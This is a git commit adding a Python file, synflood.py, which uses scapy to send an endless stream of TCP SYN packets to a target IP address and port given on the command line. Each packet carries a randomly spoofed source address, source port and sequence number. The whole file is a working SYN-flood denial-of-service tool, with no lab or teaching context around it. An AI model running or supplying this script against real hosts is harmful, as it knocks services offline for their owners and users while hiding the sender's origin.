fc9ab39d0140b84b013cc76a39be9b699c505ad6
aditya240 <67708148+aditya240@users.noreply.github.com>
2023-10-01 21:23:19 -0400

    Add files via upload

---
+++ synflood.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python3
+
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbits
+import sys
+
+if len(sys.argv) < 3 :
+    print("Usage: synflood.py IP Port")
+    quit()
+
+ip = IP(dst = sys.argv[1])
+tcp = TCP(dport = int(sys.argv[2]), flags = 'S')
+pkt = ip/tcp
+
+while True:
+    pkt[IP].src = str(IPv4Address(getrandbits(32)))
+    pkt[TCP].sport = getrandbits(16)
+    pkt[TCP].seq = getrandbits(32)
+    send(pkt, verbose = 0)
+    
